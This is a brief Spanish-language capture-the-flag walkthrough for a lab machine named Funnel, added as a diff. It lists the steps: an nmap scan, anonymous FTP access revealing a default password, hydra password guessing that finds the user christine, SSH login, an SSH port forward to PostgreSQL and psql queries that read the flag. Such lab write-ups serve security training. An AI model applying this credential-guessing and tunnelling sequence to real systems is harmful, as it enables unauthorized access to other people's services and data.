@@ -1,0 +1,31 @@
+Funnel Very easy
+
+pasamos nmap tenemos un ftp y un ssh
+
+conectamos anonimamente al ftp en la carpeta backup tneemos que el pass por defecto es
+
+funnel123#!#
+
+probamos con hydra
+
+el usuario es christine
+
+una vez tenemos ambos conectamos por ssh
+
+dentro hay un servicio en el 5432
+
+hacemos ssh -L 1234:localhost:5432 christine@ip
+
+ponemos el pass
+
+y ahora en otra ventan con psql podemos conectarnos
+
+psql -U christine -p 1234 -h localhost
+
+\l listamos
+\c secrets nos metemos en secrets
+\dt seleccionamos la tabla
+
+por ultimo select * from flag;
+
+y tenemos la flag
